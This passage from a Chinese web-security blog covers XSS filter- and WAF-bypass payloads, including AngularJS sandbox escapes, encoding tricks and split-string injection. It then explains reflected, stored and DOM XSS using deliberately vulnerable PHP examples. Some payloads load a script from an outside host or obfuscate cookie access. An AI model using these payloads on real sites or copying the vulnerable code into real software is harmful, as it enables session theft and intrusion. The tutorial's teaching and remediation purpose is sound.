class="keyword">throw</span>[<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//变量赋值</span></span><br><span class="line">top[a=<span class="string">&#x27;ert&#x27;</span>,b=<span class="string">&#x27;al&#x27;</span>,b+a](<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数赋值</span></span><br><span class="line">_=alert,_(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">_=alert;_(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">_=alert;x=<span class="number">1</span>;_<span class="string">`1`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性赋值</span></span><br><span class="line">&lt;img src=<span class="number">1</span> alt=al lang=ert onerror=top[alt%2blang](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="location对象"><a href="#location对象" class="headerlink" title="location对象"></a>location对象</h4><p><code>location</code>对象的<code>hash</code>属性用于设置或取得 URL 中的锚部分，比如：<code>http://localhost/1.php#alert(1)</code>，我们在控制台输入<code>location.hash</code>，则会返回我们设定的<code>锚</code>，即<code>#alert(1)</code>。</p>
<p>再结合<code>slice()</code>、<code>substr()</code>等字符串处理函数获取字符串。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=eval(location.hash.slice(1))&gt;#alert(1)</span><br><span class="line">    </span><br><span class="line">&lt;body/onload=setTimeout(location.hash.substr(1))()&gt;#alert(1)</span><br><span class="line">    </span><br><span class="line">&lt;body/onload=Set.constructor(location.hash.substr(1))()&gt;#alert(1)</span><br><span class="line">    </span><br><span class="line">&lt;body/onload=execScript(location.hash.substr(1))&gt;#alert(1)</span><br><span class="line">    </span><br><span class="line">&lt;body/onload=Function(location.hash.slice(1))()&gt;#alert(1)</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">eval(URL.slice(-8))</span>&gt;</span>#alert(1)    </span><br></pre></td></tr></table></figure>
<h4 id="with函数替代"><a href="#with函数替代" class="headerlink" title="with函数替代"></a>with函数替代</h4><p><code>with</code>用来引用某个特定对象中已有的属性，使用with可以实现通过节点名称的对象调用。</p>
<p>如果<code>.</code>被拦截，可以使用<code>with</code>替代。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=with(location)with(hash)eval(alert(1))&gt;</span><br></pre></td></tr></table></figure>
<p>基于DOM的方法创建和插入节点把外部JS文件注入到网页中，也可以应用<code>with</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;[1].find(function()&#123;with(`docom&#x27;|e|&#x27;nt`);;body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://192.168.123.42/xss.js&#x27;&#125;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="unescape函数解码"><a href="#unescape函数解码" class="headerlink" title="unescape函数解码"></a>unescape函数解码</h4><p><code>unescape()</code>函数用于对已经使用<code>escape()</code>函数编码的字符串进行解码，并返回解码后的字符串。</p>
<p>很多会拦截外部<code>url</code>，比如拦截<code>//</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=appendChild(createElement(&#x27;script&#x27;)).src=unescape(&#x27;http%3A%2F%2F192.168.123.42%2Fxss.js&#x27;)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="利用拼接数组函数"><a href="#利用拼接数组函数" class="headerlink" title="利用拼接数组函数"></a>利用拼接数组函数</h4><p><code>concat()</code>不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=location=&#x27;javas&#x27;.concat(&#x27;cript:ale&#x27;,&#x27;rt(1)&#x27;)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;http://v&#x27;</span><span class="attr">.</span>\<span class="attr">u0063oncat</span>(&#x27;<span class="attr">ps</span>/&#x27;,&#x27;<span class="attr">js</span>&#x27;); &gt;</span></span><br></pre></td></tr></table></figure>
<p>再补充个有些防护过滤了<code>document.cookie</code>可以试下下面的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document[&#x27;coo&#x27;[&#x27;CONCAT&#x27;.toLowerCase()](&#x27;kie&#x27;)]</span><br></pre></td></tr></table></figure>
<p><code>join()</code>将数组转换成字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=location=[<span class="string">&#x27;javas&#x27;</span>,<span class="string">&#x27;cript:al&#x27;</span>,<span class="string">&#x27;ert(1)&#x27;</span>].join(<span class="string">&#x27;&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="AngularJS框架"><a href="#AngularJS框架" class="headerlink" title="AngularJS框架"></a>AngularJS框架</h4><p>AngularJS是一个很流行的JavaScript框架，通过这个框架可以把表达式放在花括号中嵌入到页面中。例如，表达式1+2=3将会得到1+2=3。其中括号中的表达式被执行了，这就意味着，如果服务端允许用户输入的参数中带有花括号，我们就可以用Angular表达式来进行xss攻击。</p>
<blockquote>
<p>表达式沙盒化：<br>在AngularJS中，沙盒化的目的并不是为了安全，更主要的是为了分离应用，例如，用户在获取window的时候是不被允许的，因为这样可以避免在你的程序中引入全局变量。</p>
<p>但是，如果在表达式被处理之前，有攻击者修改了页面模板，这样的情况沙盒是不会拦截的。也就是说，这种情况下，任何在花括号内的语句都能被执行。</p>
</blockquote>
<p>示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;&#123;alert(<span class="number">1</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params">alert(<span class="number">1</span>)</span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;\141\154\145\162\164\050\061\051&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>)</span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;a=<span class="string">&#x27;constructor&#x27;</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;(_=<span class="string">&#x27;&#x27;</span>.sub).call.call(&#123;&#125;[$=<span class="string">&#x27;constructor&#x27;</span>].getOwnPropertyDescriptor(_.__proto__,$).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;alert(1)&quot;</span>].sort(toString.constructor);&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Mavo框架"><a href="#Mavo框架" class="headerlink" title="Mavo框架"></a>Mavo框架</h4><p>Mavo 是一个扩展自HTML的语言，用以描述应用如何管理，存储和转换数据。</p>
<p>示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[self.alert(<span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
<h2 id="htmlspecialchars函数不生效的场景"><a href="#htmlspecialchars函数不生效的场景" class="headerlink" title="htmlspecialchars函数不生效的场景"></a>htmlspecialchars函数不生效的场景</h2><p>众所周知，PHP中的<code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。这样能够有效防止跨站脚本。</p>
<blockquote>
<p>有关该函数的用法：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a></p>
</blockquote>
<p>但是在很多场景下htmlspecialchars过滤未必能奏效。</p>
<h3 id="场景一：标签属性（未过滤单引号）"><a href="#场景一：标签属性（未过滤单引号）" class="headerlink" title="场景一：标签属性（未过滤单引号）"></a>场景一：标签属性（未过滤单引号）</h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $name?&gt;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号，如果此时你的输入<code>%27%20onclick=alert(1)%20%27</code>，便可闭合前后单引号，执行js代码。</p>
<p><img src="https://i.loli.net/2021/11/11/x3rLnk8aWQ72AeX.png" alt="image-20211111122840855"></p>
<p>那么仍然会绕过htmlspecialchars()函数的检查，从而造成一个反射型的xss。</p>
<p>修补方案：</p>
<p>编码双引号和单引号。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>);</span><br><span class="line">修改为</span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>,ENT_QUOTES);</span><br></pre></td></tr></table></figure>
<p>处理之后，里边的代码就不会被当成js执行。</p>
<h3 id="场景二：script标签之间"><a href="#场景二：script标签之间" class="headerlink" title="场景二：script标签之间"></a>场景二：script标签之间</h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=Content-Type content=<span class="string">&quot;text/html;charset=gbk&quot;</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">$(document).ready(function()&#123;</span></span><br><span class="line"><span class="string">	$(&#x27;#text&#x27;).html(&quot;</span>.htmlspecialchars(<span class="variable">$name</span>).<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/11/vMZTBwaNoOjLn6H.png" alt="image-20211111124025493"></p>
<p>修补方案：</p>
<p>此处调用了html()做输出，仅考虑单引号双引号以及尖括号显然已经不够了，还必须得考虑别的因素在里面，此时应该再使用json_encode()函数进行处理。即：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#text&#x27;</span>).html(<span class="string">&quot;.htmlspecialchars(<span class="subst">$name</span>).&quot;</span>);</span><br><span class="line">修改为</span><br><span class="line">$(<span class="string">&#x27;#text&#x27;</span>).html(<span class="string">&quot;.json_encode(htmlspecialchars(<span class="subst">$name</span>)).&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>处理之后，里边的代码就不会被当成js执行。</p>
<h2 id="拆分法绕过长度限制"><a href="#拆分法绕过长度限制" class="headerlink" title="拆分法绕过长度限制"></a>拆分法绕过长度限制</h2><p>著名安全研究员剑心曾发布一篇文章叫做《疯狂的跨站之行》，里面讲述了一种特别的Xss利用技巧，就是当应用程序没有过滤Xss关键字符人（如&lt;、&gt;）却对输入字符长度有限制的情况下，如何使用“拆分法”执行跨站脚本代码。</p>
<h3 id="字符变量拆分"><a href="#字符变量拆分" class="headerlink" title="字符变量拆分"></a>字符变量拆分</h3><p>我们可以将如下的代码引入一个字符串变量<code>z</code>中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后分几次将其嵌入到变量Z中，最后通过<code>eval(z)</code>巧妙地执行代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=<span class="string">&#x27;document.&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;write(&quot;&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;&lt;scrip&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;t&gt;&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;alert(&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;&lt;/scrip&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z+=<span class="string">&#x27;t&gt;&quot;)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/18/rFVfx6uZYoMdpcL.png" alt="image-20211118210306160"></p>
<p>由此可见，拆分法跨站的核心是：把跨站代码分成几个片段，然后再使用某种方式将其拼凑在一起执行，这和缓冲区溢出的shellcode的利用方式有异曲同工之妙。</p>
<h3 id="多行注释拆分"><a href="#多行注释拆分" class="headerlink" title="多行注释拆分"></a>多行注释拆分</h3><p>可以将<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>拆分成如下片段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;/*</span><br><span class="line">*/alert/*</span><br><span class="line">*/(/xss/)/*</span><br><span class="line">*/&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>也是可以执行JavaScript脚本的</p>
<p><img src="https://i.loli.net/2021/11/18/Tma3GrOiS9su7Ck.png" alt="image-20211118212427363"></p>
<p><img src="https://i.loli.net/2021/11/18/zJjhTD6xMPcQBdt.png" alt="image-20211118212156264"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>暗月 编《渗透测试手册WEB安全漏洞》</li>
<li><a href="https://www.zhihu.com/question/27646993">XSS 攻击时怎么绕过 htmlspecialchars 函数呢？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet - 2021 Edition | Web Security Academy (portswigger.net)</a></li>
<li><a href="https://www.freebuf.com/articles/web/226719.html">2020年仍然有效的一些XSS Payload - FreeBuf网络安全行业门户</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1730672">长亭WAF XSS防护绕过小记 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://www.bilibili.com/video/BV1344y1e7qe?from=search&amp;seid=11452777208324676064&amp;spm_id_from=333.337.0.0">第十八课 - XSS fetch_哔哩哔哩_bilibili</a></li>
<li><a href="https://www.pianshen.com/article/885495888/">XSS 一次跨站拆分法的应用 - 程序员大本营 (pianshen.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS跨站脚本</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS的原理与分类</title>
    <url>/post/110c2ea3.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS?"></a>什么是XSS?</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一，位于OWASP top 10 2013/2017年度分别为第三名和第七名，在最新的owasp top 10 2021中XSS被归入注入漏洞，排第三名。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p>
<p>从上面中的一段话，可以得知，XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p>
<p>XSS攻击最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是javascript语言，但也会使用其它的脚本语言，例如：ActionScript、VBscript。而如今的互联网客户端脚本基本是基于Javascript，所以如果想要深入研究XSS，必须要精通Javascript。</p>
<p>XSS换句话说，JavaScript能做到什么效果，XSS的胃口就有多大。这完全不是危言耸听。javascript可以用来获取用户的cookie，弹出窗口，那么存在XSS漏洞的网站，XSS就可以用来盗取用户Cookie，废掉页面，导航到恶意网站！更高端的XSS代码完全可以进行监控你的键盘操作，模仿Windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入Javascript代码！</p>
<h2 id="XSS漏洞出现的原因"><a href="#XSS漏洞出现的原因" class="headerlink" title="XSS漏洞出现的原因"></a>XSS漏洞出现的原因</h2><p>程序对输入和输出的控制不够严格，导致”精心构造“的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<h2 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h2><h3 id="针对用户"><a href="#针对用户" class="headerlink" title="针对用户"></a>针对用户</h3><ol>
<li>窃取用户Cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li>
<li>劫持用户浏览器会话，将用户当前使用的SessionID信息发送至攻击者控制的网站或服务器中，从而执行任意操作。例如进行非法转账、强制发表日志、发送电子邮件等</li>
<li>网站钓鱼。在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上</li>
<li>网页挂马（水坑攻击）</li>
<li>有局限性的键盘记录</li>
<li>发广告刷流量</li>
</ol>
<h3 id="针对WEB服务"><a href="#针对WEB服务" class="headerlink" title="针对WEB服务"></a>针对WEB服务</h3><ol>
<li>内网扫描</li>
<li>进行大量的客户端攻击，如DDoS攻击</li>
<li>结合其他漏洞，如CSRF漏洞，实施进一步作恶</li>
<li>传播跨站脚本蠕虫</li>
</ol>
<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型跨站脚本也称非持久型跨站脚本、参数型跨站脚本。这种类型的跨站脚本是最常见，也是使用最广泛的一种，主要用于将恶意脚本附加到URL地址的参数中。</p>
<p>反射性XSS的利用一般是攻击者通过特定手法（比如利用电子邮件），诱使用户去访问一个含有恶意代码的URL，当受害者点击这些专门设计的链接的时候，恶意JavaScript代码会直接在受害者主机的浏览器执行。它的特点是只在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
<p>反射型XSS的攻击流程图：</p>
<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211104232043853.png" alt="image-20211104232043853"></p>
<p>此类XSS通常出现在网站的搜索栏、用户登录入口等地方，常用来窃取Cookie或进行钓鱼欺骗。</p>
<p>反射型XSS的危害往往不如存储型XSS，因为恶意代码暴力在URL参数中，并且时刻要求用户单击方可触发，稍微有点安全意识的用户可以轻易看穿链接是不可信任的。如此一来反射型XSS的攻击成本要比存储型XSS高得多。</p>
<blockquote>
<p>反射型XSS的URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
</blockquote>
<p>反射型XSS测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome <span class="subst">$name</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://hackrock.com/mylabs/xss/xss1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://i.loli.net/2021/11/04/naxrzdhvpFZ842K.png" alt="image-20211104225743847"></p>
<p>可以看到执行了JavaScript中的代码</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型跨站脚本也称持久型跨站脚本，比反射型跨站脚本更具威胁性，并且可能影响到Web服务器自身的安全。</p>
<p>此类XSS不需要用户单击特定URL就能执行跨站脚本，攻击者事先将恶意的JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意JavaScript代码的页面就会执行恶意代码。</p>
<p>存储型XSS的攻击流程图：</p>
<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211104233238841.png" alt="image-20211104233238841"></p>
<p>存储型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本常常被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在页面中，即在受害者主机上的浏览器执行恶意代码。</p>
<p>存储型XSS不需要用户去单击URL进行触发，所以它的危害比反射型XSS大，黑客可以利用它渗透网站、挂马、钓鱼……</p>
<p>更严重的是，利用此类XSS能够轻易写危害性更大的XSS蠕虫，跨站蠕虫是使用Ajax/JavaScript脚本语言编写的蠕虫病毒，能够在网站中实现病毒的几何数级传播，其感染速度和攻击效果都非常可怕。XSS蠕虫会直接影响到网站中的所有用户，也就是一个地方出现XSS漏洞，同站点下的所有用户都可能被攻击。可想而知XSS蠕虫对网站的打击是十分巨大的。</p>
<blockquote>
<p>另外，存储型XSS的恶意代码并不止是存储在服务器的数据库中，凡是能够进行持久化XSS都可以称之为存储型XSS，例如存储在浏览器的Cookie文件、LocalStorage、IndexedDB等本地存储中。随着HTML5的广泛普及，这种存储方式也越来越流行。</p>
</blockquote>
<p>存储型XSS测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$result</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Admin12345&#x27;</span>);</span><br><span class="line">	<span class="variable">$select_db</span> = mysql_select_db(<span class="string">&quot;test_db&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$txtMessage</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))&#123;</span><br><span class="line">		<span class="variable">$txtMessage</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;txtMessage&#x27;</span>];</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;insert into guestbook(txtMessage) values(&#x27;<span class="subst">$txtMessage</span>&#x27;)&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;xss2.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">		&lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;select txtMessage from guestbook&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;table width=<span class="string">&quot;80%&quot;</span> align=<span class="string">&quot;center&quot;</span> border=<span class="string">&quot;1&quot;</span> style=<span class="string">&quot;margin-bottom:10px;&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">			&lt;tr&gt;</span><br><span class="line">				&lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;txtMessage&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">			&lt;/tr&gt;</span><br><span class="line">		&lt;/table&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">			&lt;table width=<span class="string">&quot;80%&quot;</span> align=<span class="string">&quot;center&quot;</span> border=<span class="string">&quot;1&quot;</span> style=<span class="string">&quot;margin-bottom:10px;&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;留言内容&lt;/td&gt;</span><br><span class="line">					&lt;td&gt;&lt;textarea id=<span class="string">&quot;txtMessage&quot;</span> name=<span class="string">&quot;txtMessage&quot;</span> cols=<span class="string">&quot;100&quot;</span> rows=<span class="string">&quot;6&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$txtMessage</span>; <span class="meta">?&gt;</span>&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">				&lt;/tr&gt;</span><br><span class="line">				&lt;tr&gt;</span><br><span class="line">					&lt;td&gt;&lt;/td&gt;</span><br><span class="line">					&lt;td&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;&lt;/td&gt;</span><br><span class="line">				&lt;/tr&gt;</span><br><span class="line">			&lt;/table&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个非常简单的留言板程序</p>
<p><img src="https://i.loli.net/2021/11/05/w5zpuQRaOLvgJSC.png" alt="image-20211105204949911"></p>
<p>但是当我们再留言板中插入了一段XSS的payload</p>
<p><img src="https://i.loli.net/2021/11/05/hulFYfoiEK5cnIr.png" alt="image-20211105205321198"></p>
<p>弹出提示框，成功执行了JavaScript代码</p>
<p><img src="https://i.loli.net/2021/11/05/Ns4ZVOr71c8aRQ2.png" alt="image-20211105205409909"></p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。</p>
<p>DOM-XSS不经过后端，而是通过DOM节点形成的XSS。</p>
<p>DOM型XSS在攻击中的优势：</p>
<ul>
<li><p><strong>避开waf</strong></p>
